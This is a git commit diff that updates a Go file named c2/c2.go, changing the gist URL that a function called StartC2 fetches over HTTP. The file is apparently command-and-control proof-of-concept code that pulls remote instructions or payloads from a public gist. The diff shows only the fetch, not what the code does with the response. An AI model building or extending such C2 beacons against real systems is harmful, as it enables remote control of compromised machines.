412cf2db4240deb0a3485731c2bf4b6f6302094e
Roy <72743765+rroiii@users.noreply.github.com>
2025-05-29 01:14:46 +0700

    Update c2.go

--- c2/c2.go
+++ c2/c2.go
@@ -8,7 +8,7 @@ import (
 )
 
 func StartC2() {
-	url := "https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt"
+	url := "https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/b72f133f7de7502ae0a58f70906c77b6d8e217fa/poc-test.txt"
 
 	resp, err := http.Get(url)
 	if err != nil {
